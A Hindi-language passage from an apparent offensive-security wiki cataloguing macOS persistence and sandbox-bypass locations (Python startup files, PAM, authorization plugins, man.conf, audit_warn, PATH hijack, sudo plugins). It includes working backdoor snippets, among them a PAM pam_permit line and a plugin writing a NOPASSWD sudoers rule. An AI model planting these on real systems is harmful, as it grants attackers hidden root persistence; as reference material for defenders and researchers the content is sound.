{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

<a id="python-startup-files-pth--usercustomize--sitecustomize"></a>

### Python startup फ़ाइलें (`.pth` / `.start` / `usercustomize` / `sitecustomize`)

लेख: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - यह तब चलता है जब संबंधित Python interpreter उस site directory के enabled होने पर शुरू होता है; यह trigger virtual environments, Python builds या startup flags में हर जगह एक जैसा नहीं होता
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - यह उस process के privileges/TCC के साथ चलता है जिसने interpreter लॉन्च किया

#### स्थान

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Root की आवश्यकता नहीं (user-writable)
  - **Trigger**: उस Python build का startup जिसमें उसका user site enabled हो; `site` module सक्रिय site directories में `.pth` फ़ाइलों को process करता है
- **`<site-packages>/*.start`** (Python 3.15+; user या interpreter site directory)
  - **Trigger**: ऐसे interpreter का startup जिसमें यह directory शामिल हो और जो `site` load करता हो।<sup>[[58]](#references)[[59]](#references)</sup>
- **`<user-site>/usercustomize.py`**
  - Root की आवश्यकता नहीं
  - **Trigger**: user site enabled होने पर startup (`site` इसे auto-import करता है)
- **`<prefix>/site-packages/sitecustomize.py`** (जैसे `/opt/homebrew/lib/python3.13/site-packages/`, या system paths)
  - Interpreter के स्थान के आधार पर root/admin की आवश्यकता हो सकती है
  - **Trigger**: ऐसे interpreter का startup जिसमें यह site directory शामिल हो

#### विवरण और Exploitation

Startup पर Python आम तौर पर `site` import करता है और अपनी सक्रिय `site-packages` directories में `.pth` फ़ाइलें scan करता है। Paths जोड़ने के अलावा, `import ` से शुरू होने वाली `.pth` लाइन Python code execute करती है, भले ही नामित module का अन्यथा कभी उपयोग न किया जाए। Python `sitecustomize` और, **user site enabled होने पर**, `usercustomize` import करने की भी कोशिश करता है।<sup>[[56]](#references)</sup> Trigger तब होता है जब बाद में ऐसा interpreter शुरू किया जाए जो बदली हुई directory को देखता हो। `-S` `site` processing को disable करता है; `-s`, `-I`, या `PYTHONNOUSERSITE` **user-site** वाले variants को disable करते हैं। `-I` आम तौर पर global `sitecustomize` को disable नहीं करता। Virtual environments भी user site को बाहर रख सकते हैं। विशिष्ट interpreter के लिए `python3 -m site` जाँचें।

**Python 3.15 और उसके बाद के versions** में, site directory में `pkg.mod:callable` entry point वाली `<name>.start` फ़ाइल भी हो सकती है। `site` module उस module को import करके interpreter startup पर zero-argument function को call करता है, भले ही application package को कभी import न करे। उदाहरण के लिए, `foo.submod:initialize` वाली `foo.start`, user code से पहले `foo.submod.initialize()` invoke करती है। Active site directory में लिख सकने वाला package या actor इस startup path का उपयोग कर सकता है; यह केवल macOS तक सीमित नहीं है। जब `foo.start` के साथ `foo.pth` मौजूद हो, तो Python 3.15+ `.pth` की import lines छोड़कर `.start` entry का उपयोग करता है, जबकि पुराने interpreters `.start` को अनदेखा करके `.pth` line execute करते रहते हैं। Interpreters के बीच wheel की जाँच करते समय यह version अंतर मायने रखता है।<sup>[[58]](#references)[[59]](#references)[[60]](#references)</sup>

निम्नलिखित PoC macOS 26.5.2 पर चलाया गया था। इस test में `PYTHONUSERBASE` user site को एक temporary directory में ले जाता है; किसी वास्तविक user site में बदलाव नहीं किया जाता:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

दोनों markers दिखाई दिए। `-s`, `-I` या `-S` के साथ दोहराने पर इस test में दोनों **user-site** markers नहीं आए। Global site directory में `sitecustomize` का test नहीं किया गया।

## Root Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगे, जिनसे आप **root** रहते हुए और/या कुछ **अजीब शर्तों** के तहत किसी चीज़ को बस **फ़ाइल में लिखकर** execute कर सकते हैं।

### Periodic

> [!CAUTION]
> **ऐतिहासिक mechanism:** macOS 26.5.2 test machine पर `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` और `com.apple.periodic-*` launch daemons मौजूद नहीं हैं। यह न मानें कि मौजूदा system पर `/etc/periodic` बनाने से उसकी सामग्री schedule हो जाएगी। नीचे दिया गया उदाहरण इस्तेमाल करने से पहले target release पर command और enabled scheduler, दोनों की जाँच करें।

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन इसके लिए root होना ज़रूरी है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root आवश्यक है
  - **Trigger**: समय आने पर
- `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local`
  - Root आवश्यक है
  - **Trigger**: समय आने पर

#### Description & Exploitation

पुराने releases में, periodic scripts (**`/etc/periodic`**) को `/System/Library/LaunchDaemons/com.apple.periodic*` में मौजूद **launch daemons** schedule करते थे। macOS Big Sur 11.5 से periodic runner, periodic directories में मौजूद scripts को **हर फ़ाइल के owner** के रूप में execute करता था, जिससे privilege-escalation का पुराना रास्ता बंद हो गया।<sup>[[27]](#references)</sup> नीचे दिए गए commands और directory listings ऐतिहासिक output हैं, macOS 26.5.2 के test results नहीं।

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

अन्य आवधिक स्क्रिप्ट भी हैं, जिन्हें **`/etc/defaults/periodic.conf`** में निर्दिष्ट किया गया है और निष्पादित किया जाएगा:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

पुरानी प्रणालियों पर, जहाँ `periodic` और उसके launch daemons इंस्टॉल और सक्षम हों, `/etc/daily.local`, `/etc/weekly.local` और `/etc/monthly.local` अतिरिक्त निष्पादन मार्ग थे। केवल-पठन वाली एक सुरक्षित जाँच है:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> owner-आधारित नियम सीधे periodic directories में मौजूद scripts पर लागू होता था। ऐतिहासिक `999.local` wrapper, `/etc/daily.local`, `/etc/weekly.local`, या `/etc/monthly.local` को उसी ownership check के बिना source करता था; जब scheduler root के रूप में चलता था, तो ये local files root के रूप में चलती थीं। यह अंतर और Big Sur 11.5 का बदलाव [original research](https://theevilbit.github.io/beyond/beyond_0019/) में दर्ज हैं। `periodic` मौजूद न होने पर इनमें से किसी भी path को सक्रिय नहीं मानना चाहिए।

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपको root होना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- हमेशा root आवश्यक है

#### विवरण और Exploitation

चूंकि PAM, macOS के अंदर आसानी से execution की तुलना में **persistence** और malware पर अधिक केंद्रित है, इसलिए यह ब्लॉग विस्तृत व्याख्या नहीं देगा। इस technique को बेहतर ढंग से समझने के लिए **writeups पढ़ें**।<sup>[[28]](#references)</sup>

PAM modules को इससे जांचें:

```bash
ls -l /etc/pam.d
```

PAM का दुरुपयोग करके persistence/privilege escalation करने की तकनीक इतनी आसान है कि बस मॉड्यूल /etc/pam.d/sudo को संशोधित करके शुरुआत में यह पंक्ति जोड़नी होती है:

```bash
auth       sufficient     pam_permit.so
```

तो यह कुछ इस तरह **दिखेगा**:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

और इसलिए `sudo` का उपयोग करने का कोई भी प्रयास **काम करेगा**।

> [!CAUTION]
> ध्यान दें कि यह directory TCC द्वारा सुरक्षित है, इसलिए यह बहुत संभव है कि user को access की अनुमति माँगने वाला prompt दिखाई दे।

एक और अच्छा उदाहरण `su` है, जहाँ आप देख सकते हैं कि PAM modules को parameters देना भी संभव है (और आप इस file में backdoor भी डाल सकते हैं):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपको root access और अतिरिक्त configurations की ज़रूरत है
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
  - root access आवश्यक है
  - plugin का उपयोग करने के लिए authorization database को configure करना भी आवश्यक है

#### Description & Exploitation

आप एक authorization plugin बना सकते हैं, जो persistence बनाए रखने के लिए किसी user के लॉग-इन करने पर execute होगा। इनमें से कोई plugin बनाने के बारे में अधिक जानकारी के लिए पिछले writeups देखें (और सावधान रहें, गलत तरीके से लिखा गया plugin आपको अपने system से lock out कर सकता है और आपको recovery mode से अपने Mac को साफ़ करना होगा)।<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**लोड किए जाने वाले स्थान पर bundle को ले जाएँ:**

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

अंत में, इस Plugin को लोड करने के लिए **नियम** जोड़ें:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** authorization framework को बताएगा कि authorization के लिए उसे किसी external mechanism को call करना होगा। इसके अलावा, **`privileged`** इसे root के रूप में execute करवाएगा।

इसे इससे trigger करें:

```bash
security authorize com.asdf.asdf
```

और फिर **staff group के पास sudo** access होना चाहिए (पुष्टि करने के लिए `/etc/sudoers` पढ़ें)।

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपको root होना चाहिए और user को man का उपयोग करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
  - Root आवश्यक है
  - **`/private/etc/man.conf`**: जब भी man का उपयोग किया जाए

#### Description & Exploit

Config file **`/private/etc/man.conf`** उस binary/script को निर्दिष्ट करती है जिसका उपयोग man documentation files खोलने के लिए किया जाता है। इसलिए executable का path बदला जा सकता है, ताकि user जब भी कुछ docs पढ़ने के लिए man का उपयोग करे, तो एक backdoor execute हो जाए।<sup>[[31]](#references)</sup>

उदाहरण के लिए, **`/private/etc/man.conf`** में यह सेट करें:

```
MANPAGER /tmp/view
```

और फिर `/tmp/view` को इस प्रकार बनाएँ:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**लेखन**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपको root होना चाहिए और apache चालू होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd के पास entitlements नहीं हैं

#### स्थान

- **`/etc/apache2/httpd.conf`**
  - Root आवश्यक है
  - ट्रिगर: Apache2 चालू होने पर

#### विवरण और Exploit

आप `/etc/apache2/httpd.conf` में एक पंक्ति जोड़कर किसी module को load करने का निर्देश दे सकते हैं:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

इस तरह आपका compiled module Apache द्वारा लोड किया जाएगा। बस आपको इसे **एक मान्य Apple certificate से sign करना होगा**, या सिस्टम में **एक नया trusted certificate जोड़कर** उससे **इसे sign करना होगा**।

फिर, यदि ज़रूरत हो, तो यह सुनिश्चित करने के लिए कि server शुरू हो जाए, आप यह चला सकते हैं:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb के लिए कोड उदाहरण:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

लेख: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपको root होना चाहिए, auditd चल रहा होना चाहिए और warning उत्पन्न होनी चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`/etc/security/audit_warn`**
  - Root आवश्यक है
  - **ट्रिगर**: जब auditd warning का पता लगाता है

#### विवरण और Exploit

जब भी auditd warning का पता लगाता है, तो script **`/etc/security/audit_warn`** **execute** होती है। इसलिए आप इसमें अपना payload जोड़ सकते हैं।<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

आप `sudo audit -n` से चेतावनी उत्पन्न कर सकते हैं।

### Startup Items

> [!CAUTION] > **यह deprecated है, इसलिए उन directories में कुछ भी नहीं मिलना चाहिए।**

**StartupItem** एक directory है, जिसे `/Library/StartupItems/` या `/System/Library/StartupItems/` में होना चाहिए। यह directory बनने के बाद, इसमें दो विशिष्ट files होनी चाहिए:

1. एक **rc script**: startup पर चलने वाली shell script।
2. एक **plist file**, जिसका नाम विशेष रूप से `StartupParameters.plist` होना चाहिए और जिसमें विभिन्न configuration settings होती हैं।

सुनिश्चित करें कि startup process द्वारा पहचाने और उपयोग किए जाने के लिए rc script और `StartupParameters.plist` file, दोनों **StartupItem** directory के अंदर सही जगह पर हों।

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> मुझे अपने macOS में यह component नहीं मिला, इसलिए अधिक जानकारी के लिए writeup देखें।

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple द्वारा पेश किया गया **emond** एक logging mechanism है, जो अविकसित या संभवतः परित्यक्त लगता है, फिर भी उपलब्ध है। Mac administrator के लिए यह विशेष रूप से उपयोगी नहीं है, लेकिन यह अस्पष्ट service threat actors के लिए persistence का एक सूक्ष्म तरीका हो सकती है, जिस पर संभवतः अधिकांश macOS admins का ध्यान नहीं जाएगा।<sup>[[34]](#references)</sup>

जो लोग इसके अस्तित्व से परिचित हैं, उनके लिए **emond** के किसी भी दुर्भावनापूर्ण उपयोग की पहचान करना आसान है। इस service का system LaunchDaemon scripts को चलाने के लिए एक ही directory में खोजता है। इसे जांचने के लिए, यह command इस्तेमाल की जा सकती है:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### स्थान

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root की आवश्यकता
  - **ट्रिगर**: XQuartz के साथ

#### विवरण और Exploit

XQuartz अब **macOS में इंस्टॉल नहीं होता**, इसलिए अधिक जानकारी के लिए writeup देखें।<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> KEXT इंस्टॉल करना इतना जटिल है, यहाँ तक कि root के रूप में भी, कि इसे exploit के बिना sandbox-escape या persistence की व्यावहारिक तकनीक नहीं माना जाता।

#### स्थान

KEXT को startup item के रूप में इंस्टॉल करने के लिए, इसे **निम्नलिखित में से किसी एक स्थान पर इंस्टॉल करना होगा**:

- `/System/Library/Extensions`
  - OS X ऑपरेटिंग सिस्टम में निर्मित KEXT फ़ाइलें।
- `/Library/Extensions`
  - 3rd party software द्वारा इंस्टॉल की गई KEXT फ़ाइलें

आप वर्तमान में लोड की गई kext फ़ाइलों की सूची इस तरह देख सकते हैं:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

kernel extensions के बारे में अधिक जानकारी के लिए [**इस सेक्शन को देखें**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Location

- **`/usr/local/bin/amstoold`**
  - Root आवश्यक है

#### Description & Exploitation

ऐसा लगता है कि `/System/Library/LaunchAgents/com.apple.amstoold.plist` में मौजूद `plist` इस binary का इस्तेमाल कर रहा था और एक XPC service expose कर रहा था... बात यह है कि binary मौजूद नहीं थी, इसलिए आप वहाँ कुछ रख सकते थे और जब XPC service को call किया जाता, तो आपका binary call होता।<sup>[[35]](#references)</sup>

मुझे यह अब अपने macOS में नहीं मिल रहा है।

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root आवश्यक है
  - **Trigger**: जब service चलती है (बहुत कम)

#### Description & exploit

ऐसा लगता है कि इस script को चलाना बहुत आम नहीं है और मुझे यह अपने macOS में भी नहीं मिला, इसलिए अधिक जानकारी के लिए writeup देखें।<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **यह आधुनिक MacOS versions में काम नहीं करता**

यहाँ **ऐसे commands रखना भी संभव है जो startup के समय execute होंगे।** सामान्य rc.common script का उदाहरण:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd बूट कार्य

लेख: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Sandbox को bypass करने में उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (root आवश्यक)
- root आवश्यक है, साथ ही पथ के आधार पर **SIP bypass** या **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access permission भी आवश्यक है

#### स्थान

`launchd` अपने **`__TEXT,__config`** section में एक plist एम्बेड करता है, जो शुरुआती "boot tasks" का वर्णन करता है। इसमें कई संदर्भ scripts/binaries हैं, जो डिफ़ॉल्ट रूप से मौजूद **नहीं** होते और जिन्हें attacker बना सकता है:

- SIP-bypass सेट: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA सेट: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` केवल Sequoia+ पर पहले से मौजूद होता है)

#### विवरण और exploitation

यह देखने के लिए कि `launchd` कौन-सी files चलाएगा और कौन-सी keys समर्थित हैं (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…), एम्बेडेड task table dump करें:

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

संदर्भित फ़ाइलों में से कोई एक (जैसे `/etc/rc.server`) बनाने से `launchd` अगले (userspace) reboot पर उसे execute करेगा। सबसे उपयोगी entries पर SIP की पाबंदी है या इनके लिए TCC SysAdminFiles/Full Disk Access की ज़रूरत होती है, इसलिए यह root-level, reboot-triggered technique है।<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

`rc.trampoline` boot task, boot के समय `apple-trusted-trampoline` NVRAM variable में stored **platform (Apple-signed) binary** चलाता है, लेकिन **सिर्फ तभी जब `rc.trampoline=1` boot-arg set हो और SIP disabled हो** (इसमें ~390&nbsp;KB की size limit और blocking/return-fast constraint है)। इसके लिए **root + SIP disabled + Apple-signed payload** की ज़रूरत होती है, इसलिए असल दुनिया में persistence के लिए यह लगभग अव्यावहारिक है और यहाँ सिर्फ़ पूर्णता के लिए शामिल किया गया है।<sup>[[41]](#references)</sup>

### /etc/paths and /etc/paths.d (PATH hijack)

- sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (लिखने के लिए root चाहिए)
- Root आवश्यक

#### Location

- **`/etc/paths`** और **`/etc/paths.d/*`** — login के समय default `PATH` बनाने के लिए **`path_helper`** इन्हें पढ़ता है (इसे `/etc/zprofile` से invoke किया जाता है)।

#### Description & Exploitation

दोनों root-owned हैं। हमलावर के नियंत्रण वाली directory को सबसे आगे जोड़ने से (`/etc/paths` edit करके या `/etc/paths.d/` में file डालकर), हर नए login shell के `PATH` में वह directory पहले दिखाई देती है। इससे आम command (`ls`, `git`, …) के नाम वाली malicious binary असली binary को **shadow** करती है और अगली बार पीड़ित के उसे invoke करने पर चलती है।

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

विवरण: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (root की आवश्यकता है)
- root आवश्यक; परिणामस्वरूप **SIP bypass होता है**। प्रभावित macOS संस्करण **15.0–15.1** हैं; **15.2** में ठीक किया गया।

#### स्थान

- **`/Library/Filesystems/`** में filesystem bundle रखें।

#### विवरण और Exploitation

`storagekitd` के पास **`com.apple.rootless.install.heritable`** entitlement है और यह filesystem bundles के binaries को इसी SIP-bypassing क्षमता के साथ **inherited** रूप में चलाता था। एक malicious filesystem bundle डालकर, attacker SIP bypass के साथ code चला सकता था और **persistent kernel extensions** install कर सकता था या SIP-protected `LaunchDaemon` directories में लिख सकता था—ऐसी persistence जो बनी रहती है और सामान्य protections को निष्प्रभावी करती है।<sup>[[46]](#references)</sup> Apple ने macOS Sequoia 15.2 में इसे ठीक किया।

### sudo plugins (/etc/sudo.conf)

विवरण: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (`/etc/sudo.conf` में लिखने के लिए root चाहिए)
- install करने के लिए root आवश्यक; इसके बाद plugin **हर `sudo` invocation** के अंदर चलता है (setuid-root context)

#### स्थान

- **`/etc/sudo.conf`** — `Plugin` lines, **`/usr/libexec/sudo/`** (या absolute path) से shared objects load करती हैं। यह फ़ाइल डिफ़ॉल्ट रूप से मौजूद नहीं होती (sudo built-in policy का उपयोग करता है), इसलिए इसे बनाना एक साफ़ hook है।

#### विवरण और Exploitation

`sudo`, `/etc/sudo.conf` से अपने policy/approval/audit plugins load करता है। `sudo` setuid-root होने के कारण, malicious shared-object plugin **हर बार जब कोई भी user `sudo` चलाता है, root privileges के साथ** execute होता है—यह टिकाऊ root persistence देता है और हर sudo command को भी देखता है।<sup>[[51]](#references)</sup> macOS में sudo 1.9.x आता है, जो plugin API को support करता है।

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
